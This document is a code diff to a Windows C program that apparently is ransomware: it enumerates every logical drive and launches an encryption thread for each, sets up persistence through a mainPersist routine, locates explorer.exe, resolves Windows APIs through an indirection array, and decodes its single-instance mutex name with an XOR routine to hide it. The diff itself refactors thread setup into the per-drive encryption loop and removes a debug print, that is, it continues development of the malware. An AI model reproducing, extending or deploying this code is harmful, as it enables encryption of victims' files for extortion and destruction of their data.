@@ -3,6 +3,7 @@
 #include "Threading.h"
 #include "File.h"
 #include "PE.h"
+#include <stdio.h>
 extern FARPROC APIArray[54];
 
 int beginEncrypt() {
@@ -19,7 +20,12 @@ int beginEncrypt() {
 	TempGetLogicalDriveStringsA(driveStrSize, driveBuffer);
 
 	for (int i = 0; i < driveStrSize - 1; i += strlen(driveBuffer) + 1) {
+		if (initThreadStruct() == -1) {
+			free(driveBuffer);
+			return -1;
+		}
 		launchThreadEncrypt(driveBuffer + i);
+		cleanUpThread();
 	}
 	free(driveBuffer);
 	return 0;
@@ -27,14 +33,13 @@ int beginEncrypt() {
 
 int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
 	if (initAPIArray() == -1) {
-		printf("Fails\n");
 		return -1;
 	}
 
 	BYTE mutex_key[5] = { 41, 188, 104, 237, 166 };
 	BYTE mutex_str[25] = { 161, 33, 254, 104, 60, 181, 42, 241, 38, 97, 184, 41, 230, 117, 41, 166, 49, 237, 121, 52, 224, 116, 161, 43, 89 };
 
-	// Mutex wbizecif48njqgpprzkm6769
+	//Mutex wbizecif48njqgpprzkm6769
 	for (int i = 0; i < 25; i++) {
 		mutex_str[i] ^= 0xFF;
 		mutex_str[i] ^= mutex_key[i % 5];
@@ -53,6 +58,7 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
 	if (TempWaitForSingleObject(hMutex, 0)) {
 		return -1;
 	}
+
 	if (mainPersist() == -1) {
 		return -1;
 	}
@@ -60,11 +66,6 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
 		return -1;
 	}
 	findExplorerExe();
-	if (initThreadStruct() == -1) {
-		cryptCleanUp();
-		cleanExplorerLL();
-		return -1;
-	}
 
 	beginEncrypt();
 	cleanUpThread();
